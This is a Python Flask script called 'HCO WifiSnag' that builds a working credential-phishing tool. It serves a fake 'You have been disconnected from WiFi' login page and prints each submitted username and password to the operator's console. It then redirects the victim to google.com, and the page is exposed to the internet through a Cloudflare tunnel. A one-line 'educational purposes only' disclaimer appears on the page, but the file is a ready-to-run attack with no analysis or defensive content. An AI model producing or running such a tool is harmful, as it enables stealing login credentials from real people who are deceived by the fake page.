import os
import time
import webbrowser
from flask import Flask, request, render_template_string
import subprocess

YOUTUBE_URL = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"

app = Flask(__name__)

login_page = """
<!DOCTYPE html>
<html>
<head>
  <title>WiFi Login</title>
  <style>
    body {
      background-color: #111;
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 80px;
    }
    .box {
      background-color: #222;
      padding: 20px;
      border-radius: 10px;
      display: inline-block;
    }
    input {
      padding: 10px;
      width: 80%%;
      margin: 10px;
      border: none;
      border-radius: 5px;
    }
    button {
      padding: 10px 20px;
      background-color: #00ff00;
      color: black;
      font-weight: bold;
      border: none;
      border-radius: 5px;
    }
    .disclaimer {
      margin-top: 30px;
      font-size: 12px;
      color: #888;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>You have been disconnected from WiFi</h2>
    <p>Please log in again to restore your connection.</p>
    <form method="POST">
      <input type="text" name="username" placeholder="Enter Username" required><br>
      <input type="password" name="password" placeholder="Enter Password" required><br>
      <button type="submit">Login</button>
    </form>
  </div>
  <div class="disclaimer">
    This is a demo page for educational purposes only.
  </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        user = request.form.get("username")
        pw = request.form.get("password")
        print(f"\n📥 New credentials received!")
        print(f"Username: {user}")
        print(f"Password: {pw}")
        return "<script>window.location.href='https://google.com';</script>"
    return render_template_string(login_page)

def banner():
    print("\n\033[1;32m" + "═" * 30)
    print("║{:^28}║".format("HCO WifiSnag"))
    print("═" * 30 + "\033[0m")
    print("Subscribe to our YouTube channel to use this tool for free.")
    print("Redirecting in 10 seconds...\n")
    time.sleep(10)
    webbrowser.open(YOUTUBE_URL)
    input("Press Enter after subscribing to continue...\n")

def start_cloudflared():
    print("Starting Cloudflared tunnel...")
    os.system("pkill cloudflared >/dev/null 2>&1")
    subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:5000"], stdout=subprocess.PIPE)
    time.sleep(5)
    os.system("curl -s http://localhost:4040/api/tunnels | grep -o 'https://[-a-z0-9]*\\.trycloudflare.com'")

if __name__ == "__main__":
    banner()
    print("[*] Starting Flask server on port 5000...")
    subprocess.Popen(["python3", "-m", "flask", "run", "--host=0.0.0.0", "--port=5000"])
    time.sleep(3)
    start_cloudflared()
